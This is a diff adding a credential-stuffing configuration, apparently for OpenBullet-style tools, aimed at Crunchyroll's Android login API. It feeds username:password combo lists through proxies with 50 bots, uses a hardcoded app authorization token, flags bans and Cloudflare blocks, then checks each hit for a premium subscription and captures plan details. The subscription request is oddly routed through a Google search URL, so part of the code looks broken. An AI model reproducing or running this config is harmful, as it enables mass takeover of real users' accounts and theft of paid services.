@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+"Name": "Crunchyroll Android API",
+"SuggestedBots": 50,
+"MaxRecheckModes": 1,
+"Separator": ":",
+"ProxyMode": "On",
+"Queued": false,
+"Status": "FREE",
+"CustomInputs": [],
+"ForceProxy": true,
+"Data": {
+"Type": "Credentials",
+"Format": "USER:PASS"
+}
+}
+​[SCRIPT]
+​1. Génération d'un Device ID Aléatoire
+​FUNCTION Guid -> VAR "DEVICE_ID"
+​2. Requête Login vers l'API Beta (Android)
+​Note: On utilise le Basic Auth Token officiel de l'app Android
+​REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token"
+CONTENT "grant_type=password&scope=offline_access&username=<USER>&password=<PASS>&device_id=<DEVICE_ID>&device_name=Pixel+7&device_type=android"
+CONTENTTYPE "application/x-www-form-urlencoded"
+HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
+HEADER "Authorization: Basic dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
+HEADER "Etp-Anonymous-Id: <DEVICE_ID>"
+​Analyse de la réponse de connexion
+​KEYCHECK
+KEYCHAIN Success OR
+VALUE "access_token" EXISTS
+KEYCHAIN Failure OR
+VALUE "invalid_credentials" EXISTS
+VALUE "Unauthorized" EXISTS
+KEYCHAIN Ban OR
+VALUE "403 Forbidden" EXISTS
+VALUE "Cloudflare" EXISTS
+​3. Récupération du profil pour vérifier l'abonnement
+​PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN"
+​REQUEST GET "https://www.google.com/search?q=https://beta-api.crunchyroll.com/subs/v1/subscriptions/me"
+HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
+HEADER "Authorization: Bearer <TOKEN>"
+​4. Vérification Premium
+​KEYCHECK
+KEYCHAIN Success OR
+VALUE "premium" EXISTS
+VALUE "subscription" EXISTS
+KEYCHAIN Custom "FREE" OR
+VALUE "[]" EXISTS
+VALUE "no_subscription" EXISTS
+​5. Capture des infos
+​PARSE "<SOURCE>" JSON "total" -> CAP "Subs Count"
+PARSE "<SOURCE>" JSON "external_id" -> CAP "Plan"
